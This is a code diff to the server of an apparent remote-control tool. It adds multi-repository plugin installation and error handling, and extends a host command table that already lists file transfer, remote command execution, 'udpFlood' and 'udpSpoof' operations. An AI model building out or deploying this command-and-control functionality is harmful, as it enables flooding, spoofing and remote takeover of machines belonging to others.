@@ -7,7 +7,7 @@ from socket import socket, AF_INET, SOCK_STREAM
 from socket import error as sock_error
 from socket import SHUT_RDWR
 import ssl
-from urllib2 import urlopen
+from urllib2 import urlopen, HTTPError
 import argparse
 from datetime import datetime
 from thread import start_new_thread
@@ -21,7 +21,7 @@ __author__ = "Kolokotronis Panagiotis"
 __copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
 __credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas"]
 __license__ = "MIT"
-__version__ = "0.3.1"
+__version__ = "0.4.0"
 __maintainer__ = "Kolokotronis Panagiotis"
 
 
@@ -304,23 +304,45 @@ class Server(object):
             self._log("E", "%s: plugin not installed" % plugin)
 
     def install_plugin(self, plugin):
-        """Install an officially endorsed plugin."""
-        official_plugins = self.available_plugins()
+        """Install a plugin from a loaded repo."""
+        # Get the url for the plugin Download.
         try:
-            plugin_url = self.plugins["base_url"] + official_plugins[plugin]['uri']
+            plugin_url = self.available_plugins()[plugin]['uri']
         except KeyError:
             self._log("E", "%s: plugin does not exist" % plugin)
         else:
-            plugin_obj = urlopen(plugin_url)
-            plugin_cont = plugin_obj.read()
-            with open(("Plugins/%s.py" %plugin), 'w') as plugin_file:
-                plugin_file.write(plugin_cont)
-            self._log("L", "%s: plugin installed" % plugin)
+            # Download the plugin and write it to a file.
+            try:
+                plugin_obj = urlopen(plugin_url)
+                plugin_cont = plugin_obj.read()
+            except HTTPError: # Plugin repo 404ed (most probably).
+                self._log("E", "%s: plugin not available on server." % plugin)
+            else:
+                with open(("Plugins/%s.py" %plugin), 'w') as plugin_file:
+                    plugin_file.write(plugin_cont)
+                self._log("L", "%s: plugin installed" % plugin)
 
     def available_plugins(self):
         """Get a list of all available plugins."""
-        json_file = urlopen(self.plugins["base_url"] + '/plugins.json')
-        self.plugins["available"] = json.load(json_file)
+        # Clean Dictionary.
+        self.plugins["available"] = {}
+        # Iterate through all enabled repos.
+        for base_url in self.plugins["base_url"]:
+            # Get info file from repo, in case of error, log and continue.
+            try:
+                json_file = urlopen(base_url + '/plugins.json')
+            except HTTPError: # Plugin repo 404ed (most probably).
+                self._log("E", "Error connecting to plugin repo %s" % base_url)
+                continue
+            json_dct = json.load(json_file)
+            # Iterate through plugins available in current repo.
+            for plugin in json_dct:
+                # Make sure plugin is not already listed from prev repo.
+                if plugin not in self.plugins["available"]:
+                    self.plugins["available"][plugin] = json_dct[plugin]
+                    # Trasform relative uri from json file to absolute.
+                    self.plugins["available"][plugin]["uri"] = base_url + \
+                                    self.plugins["available"][plugin]["uri"]
         return self.plugins["available"]
 
     def installed_plugins(self):
@@ -427,13 +449,10 @@ class Server(object):
         tmp_dct = {}
         for host_id in self.clients["hosts"]:
             if not self.clients["hosts"][host_id].deleteme:
-                #self.clients["hosts"].pop(host_id)
                 tmp_dct[host_id] = self.clients["hosts"][host_id]
             elif self.clients["hosts"][host_id] in self.clients["selected"]:
                 self.clients["selected"].remove(self.clients["hosts"][host_id])
         self.clients["hosts"] = tmp_dct
-        #self.clients["hosts"] = [a for a in self.clients["hosts"] if a is not None]
-        #self.select([])
 
     def quit(self):
         """Interface function. Raise a Quit signal."""
@@ -442,16 +461,18 @@ class Server(object):
 class Host(object):
     """Class for hosts. Each Host object represent one host"""
     command_dict = {
-        'killMe'     : '00000',
-        'getFile'    : '00001',
-        'getBinary'  : '00002',
-        'sendFile'   : '00003',
-        'sendBinary' : '00004',
-        'udpFlood'   : '00005',
-        'udpSpoof'   : '00006',
-        'command'    : '00007',
-        'KILL'       : '00008',
-        'loadPlugin' : '00009'
+        'killMe'            : '00000',
+        'getFile'           : '00001',
+        'getBinary'         : '00002',
+        'sendFile'          : '00003',
+        'sendBinary'        : '00004',
+        'udpFlood'          : '00005',
+        'udpSpoof'          : '00006',
+        'command'           : '00007',
+        'KILL'              : '00008',
+        'loadPlugin'        : '00009',
+        'unloadPlugin'      : '00010',
+        'runPluginCommand'  : '00011'
     }
 
     def __init__(self, sock, ip, port, h_id):
@@ -471,6 +492,7 @@ class Host(object):
         self.info["systemtype"] = ""
         self.info["hostname"] = ""
         self.info["plugins"] = []
+        self.info["commands"] = []
         ########################################################################
 
         try:
